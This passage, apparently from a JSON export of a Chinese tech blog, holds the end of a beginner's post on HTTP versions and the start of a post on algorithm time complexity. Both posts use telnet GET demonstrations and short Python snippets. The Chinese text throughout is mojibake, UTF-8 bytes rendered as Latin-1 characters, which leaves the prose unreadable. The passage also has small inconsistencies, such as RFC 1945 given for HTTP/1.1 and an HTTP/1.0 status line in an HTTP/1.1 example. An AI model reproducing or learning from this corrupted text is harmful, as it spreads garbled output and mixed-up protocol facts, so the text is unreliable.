æœˆç™¼è¡¨(RFC 2068) æ–¼ 1999 å¹´ 6 æœˆç™¼å¸ƒ HTTP/1.1 æ›´æ–°ç‰ˆ(RFC 2616) æ–¼ 2014 å¹´ 6 æœˆå†æ¬¡æ›´æ–° HTTP/1.1 ä¸¦å°‡è¦æ ¼æ–‡ä»¶æ‹†æˆå…­ä»½ HTTP/2(Wikipedia) æ–¼ 2015 å¹´ 5 æœˆç™¼å¸ƒ(RFC 7540)(ç€è¦½å™¨ç›¸å®¹æ€§) åƒ…é‡å° HTTP/1.1 çš„ Message Syntax éƒ¨åˆ†ä½œå‡ºå¼·åŒ– HTTP/0.9 (å·²å»¢æ­¢) æ¦‚è¦ æ–¼ 1990 å¹´ç”± Tim Berners-Lee æå‡ºæœ€åˆçš„ HTTP å»ºè­°(WWW)\nå¯¦ä½œé‡é»\nç”¨æˆ¶ç«¯è¦æ±‚æ˜¯ä»¥ ASCII å­—å…ƒç‚ºä¸»(å–®è¡Œå‘½ä»¤å³å¯ç™¼å‡ºè«‹æ±‚ GET/) ç”¨æˆ¶ç«¯è¦æ±‚æœƒä»¥ä¸€å€‹ æ›è¡Œå­—å…ƒ (CRLF) ä¾†çµæŸ ä¼ºæœå™¨å›æ‡‰æ˜¯ä»¥ ASCII å­—å…ƒç‚ºä¸»ï¼Œå›æ‡‰å…§å®¹æ˜¯ HTML æ–‡ä»¶ æ¯æ¬¡åŸ·è¡Œå®Œ Request / Response å°±æœƒè‡ªå‹•é—œé–‰é€£ç·š ä¸»è¦ç‰¹è‰²\nClient / Server æ¶æ§‹ã€Request / Response å”å®š è·‘åœ¨ TCP/IP ä¸Šçš„ ASCII å”å®š (è¦æ±‚/å›æ‡‰) è¢«è¨­è¨ˆç”¨ä¾†å‚³è¼¸ HTML æ–‡ä»¶ æ¯å®Œæˆä¸€æ¬¡ ASCII å”å®šå°±æœƒè‡ªå‹•é—œé–‰é€£ç·š ä½¿ç”¨ bash æ¸¬è©¦ 1 2 3 4 5 6 7 8 # å»ºç«‹é€£ç·šåˆ° google $ telnet google.com 80 \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # ç™¼é€ GET è«‹æ±‚ $ GET /about \u0026gt; ... HTTP/1.0 æ¦‚è¦ åœ¨ 1991 åˆ° 1995 å¹´ä¹‹é–“ï¼Œæ‰€è¬‚ ç€è¦½å™¨ é¨°ç©ºå‡ºä¸–ï¼\næ–¼ 1996 å¹´ 5 æœˆç™¼è¡¨ HTTP/1.0 ç‰ˆ (RFC 1945)\nèˆ‡ HTTP/0.9 ä¸åŒçš„éƒ¨åˆ†\nç”¨æˆ¶ç«¯è¦æ±‚æ˜¯ä»¥ ASCII å­—å…ƒç‚ºä¸»ï¼Œä½†å¯ç™¼é€å¤šè¡Œå‘½ä»¤(å«è¦æ±‚æ¨™é ­) å…ˆé€å‡ºè¦æ±‚æ–¹æ³•ï¼Œå†é€å‡ºè¦æ±‚æ¨™é ­ï¼Œæœ€å¾Œä»¥ä¸€å€‹é¡å¤–çš„æ›è¡Œå­—å…ƒçµæŸ ä¼ºæœå™¨å›æ‡‰æ˜¯ä»¥ ASCII å­—å…ƒç‚ºä¸»ï¼Œå›æ‡‰å…§å®¹æœƒå€åˆ†ç‚º ç‹€æ…‹åˆ— å›æ‡‰æ¨™é ­ å›æ‡‰å…§æ–‡ä¸»é«”(ä¸åƒ…åƒ…æ˜¯ HTML æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯æ›´å¤šå…§å®¹é¡å‹) æ¯å®Œæˆä¸€æ¬¡ Request / Response äº¤æ¡å°±æœƒè‡ªå‹•é—œé–‰ TCP/IP é€£ç·š ä½¿ç”¨ bash æ¸¬è©¦ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # å»ºç«‹é€£ç·šåˆ° google $ telnet google.com 80 \u0026gt; Trying 172.217.24.14... \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # ç™¼é€ GET è«‹æ±‚ $ GET /about HTTP/1.0 Host: www.google.com # å› ä¸€å€‹ domain å¯ä»¥ hosting å¤šå€‹ç¶²ç«™ï¼Œå› æ­¤é€šå¸¸éƒ½æœƒæ–¼ request header å†æ¨™è¨˜ Host \u0026gt; HTTP/1.0 301 Moved Permanently \u0026gt; ... # å–å¾—å¾Œï¼Œæœƒè‡ªå‹•ä¸­æ–· TCP é€£ç·š # è‹¥éœ€å†ç™¼é€è«‹æ±‚ï¼Œéœ€é‡æ–°å»ºç«‹ TCP é€£ç·š $ telnet google.com 80 ... HTTP/1.1 æ¦‚è¦ æ–¼ 1997 å¹´ 1 æœˆç™¼è¡¨ HTTP/1.1 ç‰ˆ (RFC 1945)\næ–¼ 1999 å¹´ 6 æœˆç™¼å¸ƒ HTTP/1.1 æ›´æ–°ç‰ˆ (RFC 2616)\nèˆ‡ HTTP/1.0 ä¸åŒçš„éƒ¨åˆ†\nå‚³è¼¸å”è­°çš„æ•ˆèƒ½æ”¹é€²(æ–°å¢ä¸å°‘ HTTP æ¨™é ­å®šç¾©) æŒçºŒé€£ç·šç‹€æ…‹(persistent connection) åˆ‡å¡Šç·¨ç¢¼å‚³è¼¸(chunked encoding transfer) ä½å…ƒç¯„åœè«‹æ±‚(byte range request) é¡å¤–å¿«å–æ©Ÿåˆ¶(cache control) è«‹æ±‚ç®¡ç·šä½œæ¥­(request pipelining)(éœ€æ­é…æŒçºŒé€£ç·šç‹€æ…‹ç‰¹æ€§æ‰èƒ½ç”¨) ä½¿ç”¨ bash æ¸¬è©¦ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # å»ºç«‹é€£ç·šåˆ° google $ telnet google.com 80 \u0026gt; Trying 172.217.24.14... \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # ç™¼é€ GET è«‹æ±‚ $ GET /about HTTP/1.1 Host: www.google.com # å› ä¸€å€‹ domain å¯ä»¥ hosting å¤šå€‹ç¶²ç«™ï¼Œå› æ­¤é€šå¸¸éƒ½æœƒæ–¼ request header å†æ¨™è¨˜ Host \u0026gt; HTTP/1.0 301 Moved Permanently \u0026gt; ... # å–å¾—å¾Œï¼Œä¸æœƒè‡ªå‹•ä¸­æ–· TCP é€£ç·šï¼Œå¯å†ç™¼é€è«‹æ±‚ $ GET /abc HTTP/1.1 Host: www.google.com # å› ä¸€å€‹ domain å¯ä»¥ hosting å¤šå€‹ç¶²ç«™ï¼Œå› æ­¤é€šå¸¸éƒ½æœƒæ–¼ request header å†æ¨™è¨˜ Host \u0026gt; HTTP/1.1 404 Page Not Found \u0026gt; ... ç›®å‰ HTTP/1.1 çš„å…­å¤§è¦æ ¼ RFC 7230 HTTP/1.1ï¼šMessage Syntax and Routing RFC 7231 HTTP/1.1ï¼šSemantics and Content(æœ€é‡è¦) RFC 7232 HTTP/1.1ï¼šConditional Requests RFC 7233 HTTP/1.1ï¼šRange Requests RFC 7234 HTTP/1.1ï¼šCaching RFC 7235 HTTP/1.1ï¼šAuthentication é—œæ–¼ HTTP é€šè¨Šå”å®šçš„åŸºæœ¬å¸¸è­˜ ç„¡ç‹€æ…‹ç‰¹æ€§(stateless)ï¼šç›¸åŒçš„ requestï¼Œéƒ½æœƒå¾—åˆ°ç›¸åŒçš„ responseï¼Œä¸æœƒå› ç‚ºç‹€æ…‹ä¸åŒè€Œæ”¹è®Š åˆ†æ•£å¼æ¶æ§‹(distributed)ï¼šç›¸åŒçš„ requestï¼Œä¸åŒè¼‰é«”ç™¼é€ï¼Œéƒ½æœƒå¾—åˆ°ç›¸åŒçš„ response å”ä½œçš„æ¶æ§‹(collaborative)ï¼šä¸ä¸€å®šåªæœ‰ client / serverï¼Œä¹Ÿå¯ä»¥æ˜¯ client / proxy / reverse proxy / server è¶…æ–‡æœ¬(hypertext = not just \u0026ldquo;text) but with \u0026ldquo;links\u0026rdquo;)ï¼šé™¤äº†å…§å®¹ï¼Œé‚„åŒ…å«é€£çµ åˆå­¸è€…æ‡‰äº†è§£ HTTP çš„åŸºæœ¬é‹ä½œæ–¹å¼ å¦‚ä½•ç™¼å‡º HTTP è¦æ±‚(HTTP Request)\nè¦æ±‚æ–¹æ³•(Request Methods) GETã€POSTã€PUTã€DELETEã€PATCHã€\u0026hellip; è¦æ±‚æ¨™é ­(Request Headers) Connectionã€COntent-Typeã€\u0026hellip; æ–·è¡Œç¬¦è™Ÿ(CRLF) è¦æ±‚å…§å®¹ä¸»é«”(Request Body) å¦‚ä½•å›æ‡‰ HTTP è¨Šæ¯(HTTP Response)\nå›æ‡‰ç‹€æ…‹ç¢¼(Response Status Codes) HTTP/1.1 200 OK å›æ‡‰æ¨™é ­(Response Headers) æ–·è¡Œç¬¦è™Ÿ(CRLF) å›æ‡‰å…§å®¹ä¸»é¡Œ(Response Body) HTTP/2 HTTP/2 å„å€‹ç€è¦½å™¨çš„æ”¯æ´åº¦ é»æˆ‘æŸ¥çœ‹ç€è¦½å™¨æ”¯æ´åº¦\nEdge / Firefox / Chrome / Opera çš†åœ¨ 2015 å¹´èµ·å°±æ”¯æ´ HTTP/2ï¼ŒåŸºæœ¬ä¸Šä¸éœ€è¦å¤ªæ“”å¿ƒä¸»æµç€è¦½å™¨çš„æ”¯æ´æ€§å•é¡Œã€‚\nPSï¼šå¦‚ä½•åœ¨ Node.js ä¸­ä½¿ç”¨ HTTP/2\nHTTP/2 æ”¹å–„äº†ä»€éº¼ï¼Ÿ http/2æ¨™æº–ç™¼å¸ƒæ–¼2015å¹´5æœˆï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯é€éä¸€äº›æªæ–½æ”¹å–„ç€è¦½å™¨ç€è¦½ç¶²é  åŠ è¼‰çš„é€Ÿåº¦(page load) ã€‚ç›®å‰å¤§å¤šæ•¸çš„ç€è¦½å™¨å·²æ”¯æ´ http/2 (chrome, firefox, safariç­‰)æ¨™æº–ï¼Œåˆ http/2èˆ‡ http/1.1æœ‰è‘—é«˜åº¦çš„ç›¸å®¹ä¿¡ï¼Œèˆ‰å‡¡request method(post, get..etc), http status code, url, header ç­‰ç­‰ï¼Œå› æ­¤å°æ–¼web developerä¾†èªªï¼Œåªéœ€è¦ç¢ºä¿ä½ çš„ç¶²ç«™æœ‰æ”¯æ´https(å› ç‚ºç€è¦½å™¨åªæ”¯æ´https åœ¨http/2ä¸Š)ã€‚é‚£éº¼http/1.1èˆ‡http/2åˆ°åº•ç›¸å·®å¤šå¿«å‘¢ï¼Œé»æˆ‘é«”é©—!\nHTTP/2 æ˜¯å¦‚ä½•æ”¹å–„ï¼Ÿ åªéœ€è¦å–®ä¸€ç¶²è·¯é€£ç·š (Single TCP connection) åªéœ€è¦å–®ä¸€ç¶²è·¯é€£ç·šï¼Œå°±å¯ä»¥é€£æ¥ç¶²ç«™ä¼ºæœå™¨ï¼Œä¸‹è¼‰æ‰€æœ‰éœ€è¦çš„è³‡æºã€‚å¤§å¤§ç¯€çœ HTTP/1.1 éœ€è¦ä¸€ç›´å»ºç«‹å¤šå€‹ç¶²è·¯é€£ç·šæ™‚çš„å•Ÿå‹•æ™‚é–“æµªè²»ã€‚\nRequest and response multiplexing (å¤šè·¯è¤‡ç”¨) åœ¨ http/1.1 ä¸­ï¼Œclient ç«¯æ™‚å¸¸æœƒåŒæ™‚ç™¼èµ·å¤šå€‹ request è‡³ server æ‹¿å–æª”æ¡ˆ(åƒæ˜¯js, css, imageç­‰)ï¼Œä»¥æ­¤æ–¹å¼é”åˆ°å¿«é€Ÿè¼‰å…¥é é¢ã€‚å¦‚ä¸‹åœ–åœ¨ http/1.1 ä¸­æœƒåŒæ™‚èˆ‡ server å»ºç«‹3å€‹ TCP connectionï¼Œä½†æ˜¯ç€è¦½å™¨é€šå¸¸æœƒé™åˆ¶ TCP connection åŒæ™‚å»ºç«‹çš„æ•¸ç›®ã€‚å› æ­¤åœ¨ http/2 å”å®šä¸­ï¼Œå…è¨± client ç«¯èˆ‡åŒä¸€ server å»ºç«‹å–®ä¸€ TCP connection ä¸¦ä»¥éåŒæ­¥æ–¹å¼å‚³è¼¸è¦çš„æª”æ¡ˆã€‚\nå„ªå…ˆæ¬Šè¨­è¨ˆ (Prioritization) ä¼ºæœå™¨å¯ä»¥æ±ºå®šä¾‹å¦‚ CSS æˆ– JavaScript æª”æ¡ˆï¼Œå“ªäº›è¦å„ªå…ˆå‚³é€ã€‚\nHeader compression (æ¨™é ­å£“ç¸®) æ¯ä¸€å€‹ http çš„å‚³è¼¸ä¸­éƒ½æœƒæ”œå¸¶ä¸€çµ„ headerï¼Œåœ¨ http/1.1 ä¸­ï¼Œheader æœƒæ˜¯ä»¥æ˜æ–‡(plain text)å‚³è¼¸å¤§å°é€šå¸¸æœƒæ˜¯500-800 bytesï¼Œè‹¥æœ‰æ”œå¸¶ cookie ä¹Ÿæœ‰å¯èƒ½æœƒæ›´å¤§ã€‚å› æ­¤åœ¨ http/2 ä¸­ï¼Œæœƒå°‡ request ä»¥åŠ response çš„ header ä½¿ç”¨ HPACK æ¼”ç®—æ³•å£“ç¸® header çš„å…§å®¹ï¼Œæ­¤æ–¹æ³•å£“ç¸®å¾Œå¯ä»¥æ¸›å°‘ 85%-88% çš„å¤§å°ã€‚\nServer push (ä¼ºæœå™¨æ¨é€) åœ¨ http/1.1 ä¸­ï¼Œé€šå¸¸ client ç«¯ request ç”šéº¼ server å°±æœƒå›å‚³ç”šéº¼ï¼Œä¾‹å¦‚: ç•¶ client request html é‚£éº¼ server å°‡åªæœƒå›å‚³ htmlã€‚ä½†åœ¨ http/2 ä¸­ï¼Œå…è¨± server ä¸»å‹•æ¨é€æœ‰ç›¸é—œçš„è³‡æ–™çµ¦ clientï¼Œä¾‹å¦‚: ç•¶ client åª request htmlï¼Œä½†æ˜¯ server çŸ¥é“ client request æ­¤ html å¾ŒçºŒä¹Ÿæœƒ request css, js ç­‰ï¼Œå› æ­¤ server å°±æœƒåœ¨ client æ²’æœ‰ request çš„æƒ…æ³ä¸‹ä¸»å‹•æ¨é€ css, js æª”çµ¦ clientã€‚é‚£ server æ€éº¼çŸ¥é“é€™äº›æª”æ¡ˆæ˜¯æœ‰ç›¸é—œæ€§çš„å‘¢? web developer å°‡éœ€è¦ server push çš„æª”æ¡ˆåŠ ä¸Šç‰¹å®šçš„æè¿°å³å¯ã€‚(æè¿°)\nä¸éï¼Œé€™å€‹åŠŸèƒ½æ¯”è¼ƒæœ‰çˆ­è­°ï¼Œä¸€ä¾†ä»–éœ€è¦ Web é–‹ç™¼è€…é¡å¤–æè¿°æœ‰å“ªäº›æª”æ¡ˆéœ€è¦éš¨è‘— HTML ä¸€èµ·æ¨é€çµ¦ç€è¦½å™¨ï¼Œä¸æ˜¯ Web ä¼ºæœå™¨å‡ç´š HTTP/2 å°±è‡ªå‹•æœƒæœ‰ã€‚äºŒä¾†å®ƒä¸ç®¡ç€è¦½å™¨æ˜¯ä¸æ˜¯å·²ç¶“æœ‰å¿«å–é€™å€‹è³‡æºï¼Œéƒ½æœƒæ¨é€è€Œé€ æˆé »å¯¬æµªè²»ã€‚å› æ­¤å¯¦å‹™ä¸Šç­†è€…èªç‚ºå¯ä»¥æ”¹ç”¨ç€è¦½å™¨çš„ Prefetch åŠŸèƒ½ï¼Œè®“å®¢æˆ¶ç«¯çš„ç€è¦½å™¨è‡ªå·±è™•ç†å³å¯ã€‚\nBinary framing layer (äºŒé€²åˆ¶å½±æ ¼å±¤) åœ¨ http/2 ä¸­ï¼Œheader èˆ‡ body æ‰€æŒ¾å¸¶çš„ property èˆ‡ http/1.1 ç›¸åŒ(ex. verbs, methods)ï¼Œç„¶è€Œå…©è€…åœ¨å‚³è¼¸ä¸Šæœƒæœ‰ä¸åŒã€‚åœ¨ http/2 ä¸­ï¼Œæœƒå°‡ header ä»¥åŠ body ç·¨ç¢¼æˆäºŒé€²åˆ¶åœ¨ server èˆ‡ client ç«¯ä¸­å‚³è¼¸ï¼Œåœ¨ http/1.1 ä¸­ï¼Œå‰‡æ˜¯ä»¥æ˜æ–‡çš„æ–¹å¼å‚³è¼¸ã€‚å°‡è¨Šæ¯ç·¨ç¢¼æˆäºŒé€²åˆ¶é€²è¡Œå‚³è¼¸ï¼Œæ­¤ç‰¹æ€§æ˜¯ http/2 çš„å…¶ä»–ç‰¹æ€§çš„æ ¹æœ¬åŸºç¤ã€‚\nå†·çŸ¥è­˜ï¼šåœ¨ HTTP/1.1 å®šç¾©äº†å››ç¨®è§£æè¨Šæ¯çš„æ–¹å¼ï¼Œåœ¨ HTTP/2 åªéœ€è¦ä¸€ç¨®ã€‚\nç¸½çµ æ ¹æ“š w3Techs ç¶²ç«™ï¼Œç›®å‰ä½¿ç”¨http/2çš„ç¶²ç«™æœ‰45.7%ï¼Œæœªä¾†ç¢ºå¯¦æœƒè®Šæˆä¸»æµï¼Œèº«ç‚ºè»Ÿé«”å·¥ç¨‹å¸«ï¼Œé‚„æ˜¯å¤šå°‘ç†è§£ä¾†çš„å¥½ã€‚æ­¤ç¯‡æ–‡ç« åƒ…è¨˜éŒ„ç­†è€…è’é›†è³‡æ–™å½™æ•´çµæœï¼Œè‹¥æœ‰ä»»ä½•éŒ¯èª¤è³‡è¨Šé‚„è«‹ç›´æ¥é»å‡ºï¼Œè¬åˆ†æ„Ÿè¬ã€‚\n","date":"2022-07-24T00:00:00Z","image":"https://live.staticflickr.com/65535/52276290470_787c77a1b5_o.jpg","permalink":"https://wayneblog.ga/2022-07-24/beginner-http-lesson/","title":"åˆå­¸è€…éƒ½è©²äº†è§£çš„ HTTP é€šè¨Šå”å®šåŸºç¤"},{"content":" åƒè€ƒç¶²ç«™ - åˆå­¸è€…å­¸æ¼”ç®—æ³•ï½œå¾æ™‚é–“è¤‡é›œåº¦èªè­˜å¸¸è¦‹æ¼”ç®—æ³•\næº«æ•…çŸ¥æ–° æ¼”ç®—æ³•çš„ç°¡å–®å®šç¾©ï¼šè¼¸å…¥ + æ¼”ç®—æ³• = è¼¸å‡º æ™‚é–“è¤‡é›œåº¦ï¼šè¡¡é‡æ¼”ç®—æ³•åŸ·è¡Œå¥½å£çš„å·¥å…· å¤§ O ç¬¦è™Ÿï¼šç”¨ä¾†æè¿°æ¼”ç®—æ³•åœ¨è¼¸å…¥ n å€‹æ±è¥¿æ™‚ï¼Œæ‰€éœ€æ™‚é–“èˆ‡ n çš„é—œä¿‚ åœ¨ n éå¸¸å¤§æ™‚ï¼Œå¥½çš„æ¼”ç®—æ³•è¨­è¨ˆå¯ä»¥çœä¸‹éå¸¸å¤šæ™‚é–“ æ¼”ç®—æ³•çš„é€Ÿåº¦ä¸æ˜¯ä»¥ç§’è¨ˆç®—ï¼Œè€Œæ˜¯ä»¥æ­¥é©Ÿæ¬¡æ•¸ å¯¦å‹™ä¸Šï¼Œæˆ‘å€‘åªæœƒç´€éŒ„æœ€é«˜æ¬¡æ–¹çš„é‚£ä¸€é …ï¼Œä¸¦å¿½ç•¥å…¶æ‰€æœ‰çš„ä¿‚æ•¸ ç›®éŒ„ï¼šå¸¸è¦‹çš„å…­ç¨®æ™‚é–“è¤‡é›œåº¦èˆ‡æ¼”ç®—æ³• O(1)ï¼šé™£åˆ—è®€å– O(n)ï¼šç°¡æ˜“æœå°‹ O(log n)ï¼šäºŒåˆ†æœå°‹ O(nlogn)ï¼šåˆä½µæ’åº O(nÂ²)ï¼šé¸æ“‡æ’åº O(2^n)ï¼šè²»æ³¢é‚£å¥‘æ•¸åˆ— O(1)ï¼šé™£åˆ—è®€å– èªªæ˜ æ™‚é–“è¤‡é›œåº¦ç‚º O(1) çš„æ¼”ç®—æ³•ï¼Œä»£è¡¨è‘—ä¸ç®¡ä½ è¼¸å…¥å¤šå°‘å€‹æ±è¥¿ï¼Œç¨‹å¼éƒ½æœƒåœ¨åŒä¸€å€‹æ™‚é–“è·‘å®Œã€‚åœ¨ç¨‹å¼è¨­è¨ˆä¸­ï¼Œæœ€ç°¡å–®çš„ä¾‹å­å°±æ˜¯è®€å–ä¸€å€‹é™£åˆ—ä¸­ç‰¹å®šç´¢å¼•å€¼çš„å…ƒç´ (ç¨‹å¼éº»ç“œå…ˆåˆ¥æ€¥è‘—åè¡€ï¼Œä¸”è®“æˆ‘å€‘åœ¨ä¸‹é¢æ…¢æ…¢èªªæ˜)ã€‚\né™£åˆ—è®€å– é™£åˆ—æ˜¯ç¨‹å¼ä¸­å„²å­˜æ±è¥¿çš„ä¸€ç¨®å®¹å™¨ï¼Œæˆ‘å€‘å¯ä»¥æƒ³åƒæˆä¸€æ’å·²ç¶“ç·¨è™Ÿå¥½çš„æ«ƒå­ã€‚æ¯ä¸€å€‹æ«ƒå­ä¸Šçš„ç·¨è™Ÿæˆ‘å€‘ç¨±ç‚ºã€Œç´¢å¼•å€¼ã€ï¼ˆIndexï¼Œåœ¨ç¨‹å¼ä¸­é€™å€‹ç·¨è™Ÿé€šå¸¸å¾ 0 é–‹å§‹ï¼‰ï¼Œè€Œæ«ƒå­è£¡çš„ç‰©å“æˆ‘å€‘ç¨±ç‚ºã€Œå…ƒç´ ã€ã€‚ä¾‹å¦‚ï¼šå‡è¨­ç¥å¥‡å¯¶è²å¤§å¸«å°æ˜åœ¨ä¸€å€‹åå« Pokemons çš„é™£åˆ—è£¡ä¾åºæ”¾å…¥ä»–çš„ç¥å¥‡å¯¶è²å€‘ï¼Œæˆ‘å€‘ä¾†è¤‡ç¿’ä¸€ä¸‹é™£åˆ—ã€å…ƒç´ ã€ç´¢å¼•å€¼çš„é—œä¿‚ï¼š\nåœ¨ç¨‹å¼ç¢¼ä¸­æˆ‘å€‘æŠŠä¸ƒéš»ç¥å¥‡å¯¶è²é€™æ¨£è¡¨é”ï¼š\n1 Pokemons = [\u0026#34;å¡ä¸˜\u0026#34;,\u0026#34;èƒ–ä¸\u0026#34;,\u0026#34;å°¼é¾œ\u0026#34;,\u0026#34;æ¯”ç¸\u0026#34;,\u0026#34;å‘†ç¸\u0026#34;,\u0026#34;ç¨®å­\u0026#34;,\u0026#34;å°å‰›\u0026#34;] é€™æ™‚ï¼Œå‡è¨­æˆ‘å€‘æƒ³è¦çŸ¥é“åœ¨é€™å€‹ Pokemons é™£åˆ—ä¸­ä»»ä¸€å€‹ç·¨è™Ÿæ‰€å°æ‡‰åˆ°çš„ç¥å¥‡å¯¶è²ï¼Œæˆ‘å€‘éƒ½åªéœ€è¦æŠŠé€™å€‹ç·¨è™Ÿå°æ‡‰çš„å…ƒç´ å°å‡ºä¾†ï¼Œå°±èƒ½çŸ¥é“å°æ‡‰çš„ç¥å¥‡å¯¶è²æ˜¯èª°äº†ã€‚å¦‚æœæˆ‘æƒ³çŸ¥é“é€™å€‹é™£åˆ—ä¸­çš„ç¬¬ n è™Ÿæ«ƒçš„ç¥å¥‡å¯¶è²æ˜¯èª°ï¼ˆä»¥ä¸‹å‡è¨­æˆ‘å€‘æƒ³çŸ¥é“ n= 0ï¼‰ï¼Œåœ¨ç¨‹å¼ç¢¼ä¸­æˆ‘å€‘å¯ä»¥é€™æ¨£è¡¨é”ï¼š\n1 2 3 4 n = 0 print(Pokemons[n]) \u0026gt;\u0026gt; \u0026#34;å¡ä¸˜\u0026#34; é™£åˆ—è®€å–æ™‚ï¼Œå› ç‚ºæˆ‘å€‘å·²ç¶“çŸ¥é“æ«ƒå­çš„ç´¢å¼•å€¼ï¼Œä¸ç®¡æ”¾å…¥çš„ n ç­‰æ–¼å¤šå°‘ï¼Œç¨‹å¼éƒ½å¯ä»¥åœ¨ â€œä¸€å€‹æ­¥é©Ÿâ€ å°±åˆ°é” n æ‰€å°æ‡‰åˆ°ç·¨è™Ÿçš„æ«ƒå­ä¸¦å–å‡ºè©²å…ƒç´ ï¼Œåƒé€™æ¨£çš„æ¡ˆä¾‹ï¼Œæˆ‘å€‘å°±æœƒèªªé™£åˆ—è®€å–æ¼”ç®—æ³•çš„æ™‚é–“è¤‡é›œåº¦ç‚º O(1)ã€‚\nO(n)ï¼šç°¡æ˜“æœå°‹ èªªæ˜ æ™‚é–“è¤‡é›œåº¦ç‚º O(n) çš„æ¼”ç®—æ³•ï¼Œä»£è¡¨è‘—åŸ·è¡Œæ­¥é©Ÿæœƒè·Ÿè‘—è¼¸å…¥ n ç­‰æ¯”ä¾‹çš„å¢åŠ ã€‚ä¾‹å¦‚ç•¶ n = 8ï¼Œç¨‹å¼å°±æœƒåœ¨ 8 å€‹æ­¥é©Ÿå®Œæˆã€‚æœ€ç°¡å–®çš„ä¾‹å­ï¼Œå°±æ˜¯æ‰€è¬‚çš„ç°¡æ˜“æœå°‹ã€‚\né€™é‚Šè¦ç‰¹åˆ¥æé†’ä¸€é»ï¼Œé€šå¸¸ç¨‹å¼æ­¥é©Ÿçš„æ™‚é–“è¤‡é›œåº¦æœƒæ˜¯ç”¨ç¨‹å¼åŸ·è¡Œæœƒç¢°åˆ°çš„æœ€å£ç‹€æ³ (Worst Case) ä¾†è¡¨ç¤ºï¼Œè©³ç´°ä¾‹å­æˆ‘å€‘å¯ä»¥åœ¨ä¸‹é¢çœ‹åˆ°ã€‚\nç°¡æ˜“æœå°‹ è®“æˆ‘å€‘æ²¿ç”¨ä¸Šä¸€æ®µçš„ Pokemons é™£åˆ—ä½œç‚ºä¾‹å­ã€‚Pokemons é€™ä¸€æ’æ«ƒå­è£¡æœ‰å…«éš»ç¥å¥‡å¯¶è²ï¼Œå‡è¨­æ¯å€‹æ«ƒå­çš„é–€éƒ½è¢«é—œä¸Šï¼Œæˆ‘å€‘äº‹å‰ä¹Ÿä¸çŸ¥é“å„å€‹ç¥å¥‡å¯¶è²çš„ä½ç½®ï¼Œé€™æ™‚å¦‚æœæƒ³è¦çŸ¥é“ã€Œå‘†ç¸ã€ç¥å¥‡å¯¶è²åœ¨å“ªè£¡æ™‚ï¼Œæˆ‘å€‘ç¬¬ä¸€å€‹æƒ³åˆ°çš„æ–¹æ³•æœƒæ˜¯ä»€éº¼å‘¢ï¼Ÿ\næœ€ç›´è§€åœ°æƒ³ï¼Œæˆ‘å€‘æœƒå¾ç¬¬ä¸€å€‹æ«ƒå­é–‹å§‹è©¦ï¼Œä¸€æ¬¡é–‹ä¸€å€‹æ«ƒå­ï¼Œç›´åˆ°æ‰¾åˆ°ã€Œå‘†ç¸ã€ç‚ºæ­¢ã€‚åƒé€™æ¨£çš„æœå°‹æ–¹æ³•ï¼Œå°±æ˜¯æœ€ç¶“å…¸ç°¡å–®çš„ã€Œç°¡æ˜“æœå°‹ã€ã€‚\nåœ¨ç¨‹å¼ç¢¼ä¸­ï¼Œç°¡æ˜“æœå°‹çš„æ–¹æ³•å¯ä»¥é€™æ¨£è¡¨é”ï¼š\n1 2 3 4 5 6 7 Pokemons = [\u0026#34;å¡ä¸˜\u0026#34;,\u0026#34;èƒ–ä¸\u0026#34;,\u0026#34;å°¼é¾œ\u0026#34;,\u0026#34;æ¯”ç¸\u0026#34;,\u0026#34;å‘†ç¸\u0026#34;,\u0026#34;ç¨®å­\u0026#34;,\u0026#34;å°å‰›\u0026#34;] for Pokemon in Pokemons: if Pokemon == \u0026#34;å‘†ç¸\u0026#34;: print(\u0026#34;æ‰¾åˆ°å‘†ç¸ï¼\u0026#34;) break else: print(\u0026#34;é€™å€‹æ«ƒå­è£¡ä¸æ˜¯å‘†ç¸\u0026#34;) è§€å¯Ÿä¸Šé¢çš„ç¨‹å¼ç¢¼æ™‚ï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾ï¼Œå¦‚æœå‘†ç¸åœ¨ç¬¬ 0 è™Ÿæ«ƒï¼Œæˆ‘å€‘ä¸€å€‹æ­¥é©Ÿå°±æœƒæ‰¾åˆ°å®ƒï¼Œä½†å¦‚æœä»–æ˜¯åœ¨ç¬¬ 6 è™Ÿæ«ƒï¼Œæˆ‘å€‘è¦èŠ±ä¸ƒå€‹æ­¥é©Ÿæ‰èƒ½æ‰¾åˆ°ä»–ã€‚\né‚„è¨˜å¾—æˆ‘å€‘åœ¨ä¸Šé¢æéçš„å°å°æé†’å—ï¼Ÿæˆ‘å€‘é€šå¸¸æœƒç”¨ç¨‹å¼åŸ·è¡Œæœƒç¢°åˆ°çš„ã€Œæœ€å£ç‹€æ³ã€ä¾†æ±ºå®šè¤‡é›œåº¦çš„è¡¨ç¤ºï¼Œä¹Ÿå› æ­¤ï¼Œç•¶æˆ‘å€‘è¦å¾ n å€‹æ«ƒå­ä¸­æ‰¾åˆ°ä¸€éš»ç‰¹å®šçš„ç¥å¥‡å¯¶è²ï¼Œæˆ‘å€‘æœ€æ…˜æœ€æ…˜çš„æƒ…æ³éœ€è¦èŠ±å‰›å¥½ n å€‹æ­¥é©Ÿæ‰èƒ½æ‰¾åˆ°ï¼ˆæƒ³åƒè¦æ‰¾çš„ç¥å¥‡å¯¶è²åœ¨æœ€å¾Œä¸€å€‹æ«ƒå­çš„æƒ…æ³ï¼‰ã€‚åƒé€™æ¨£çš„æ¡ˆä¾‹ï¼Œæˆ‘å€‘å°±æœƒèªªç°¡æ˜“æœå°‹æ¼”ç®—æ³•çš„æ™‚é–“è¤‡é›œåº¦ç‚º O(n)ã€‚\nO(log n)ï¼šäºŒåˆ†æœå°‹æ³• èªªæ˜ æ™‚é–“è¤‡é›œåº¦ç‚º O(log n) çš„æ¼”ç®—æ³•ï¼ˆé€™é‚Šçš„ log éƒ½æ˜¯ä»¥äºŒç‚ºåº•ï¼‰ï¼Œä»£è¡¨ç•¶è¼¸å…¥çš„æ•¸é‡æ˜¯ n æ™‚ï¼ŒåŸ·è¡Œçš„æ­¥é©Ÿæ•¸æœƒæ˜¯ log nã€‚ï¼ˆè®“å¿˜è¨˜ log 